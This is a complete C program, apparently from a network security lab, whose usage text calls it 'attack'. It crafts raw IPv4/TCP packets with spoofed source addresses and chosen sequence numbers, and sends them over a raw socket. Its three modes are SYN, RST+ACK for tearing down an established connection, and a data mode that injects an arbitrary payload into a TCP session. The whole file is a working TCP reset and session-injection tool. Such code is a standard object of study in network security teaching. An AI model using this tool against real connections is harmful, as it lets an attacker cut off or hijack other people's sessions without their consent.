#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

struct pseudo_header {
    uint32_t src;
    uint32_t dst;
    uint8_t zero;
    uint8_t protocol;
    uint16_t len;
};

unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum = 0;
    while (nwords--) sum += *buf++;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[]) {
    if (argc < 8) {
        fprintf(stderr,
          "Usage:\n"
          "  SYN: sudo ./attack S <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
          "  RST: sudo ./attack R <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack>\n"
          "  INJ: sudo ./attack D <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> <payload>\n");
        return 1;
    }

    char type      = argv[1][0];
    char *src_ip   = argv[2];
    int src_port   = atoi(argv[3]);
    char *dst_ip   = argv[4];
    int dst_port   = atoi(argv[5]);
    uint32_t seq   = (uint32_t)strtoul(argv[6], NULL, 10);
    uint32_t ack   = (uint32_t)strtoul(argv[7], NULL, 10);
    char *payload  = (argc > 8) ? argv[8] : "";
    int payload_len = (type == 'D') ? (int)strlen(payload) : 0;

    char packet[4096];
    memset(packet, 0, sizeof(packet));

    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    char *data = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));

    if (payload_len > 0) {
        memcpy(data, payload, payload_len);
    }

    // IP header
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    ip->id = htons(54321);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = inet_addr(src_ip);
    ip->daddr = inet_addr(dst_ip);
    ip->check = 0;
    ip->check = csum((unsigned short *)ip, ip->ihl * 2);

    // TCP header
    tcp->source = htons(src_port);
    tcp->dest   = htons(dst_port);
    tcp->seq    = htonl(seq);
    tcp->ack_seq= htonl(ack);
    tcp->doff   = 5;
    tcp->window = htons(65535);
    tcp->urg_ptr= 0;

    // Flags
    tcp->syn = 0;
    tcp->rst = 0;
    tcp->ack = 0;
    tcp->psh = 0;

    if (type == 'S') {
        tcp->syn = 1;
    } else if (type == 'R') {
        tcp->rst = 1;
        tcp->ack = 1;  // RST+ACK is safer for an established connection
    } else if (type == 'D') {
        tcp->psh = 1;
        tcp->ack = 1;
    }

    // TCP checksum with pseudo-header
    struct pseudo_header psh;
    psh.src = ip->saddr;
    psh.dst = ip->daddr;
    psh.zero = 0;
    psh.protocol = IPPROTO_TCP;
    psh.len = htons(sizeof(struct tcphdr) + payload_len);

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + payload_len;
    char *pseudogram = malloc(psize);
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcp, sizeof(struct tcphdr) + payload_len);

    tcp->check = 0;
    tcp->check = csum((unsigned short *)pseudogram, psize / 2);
    free(pseudogram);

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        perror("socket");
        return 1;
    }

    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(s);
        return 1;
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = tcp->dest;
    sin.sin_addr.s_addr = ip->daddr;

    int packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;

    if (sendto(s, packet, packet_len, 0,
               (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("sendto");
        close(s);
        return 1;
    }

    printf("Sent %c from %s:%d to %s:%d, seq=%u ack=%u\n",
           type, src_ip, src_port, dst_ip, dst_port, seq, ack);

    close(s);
    return 0;
}
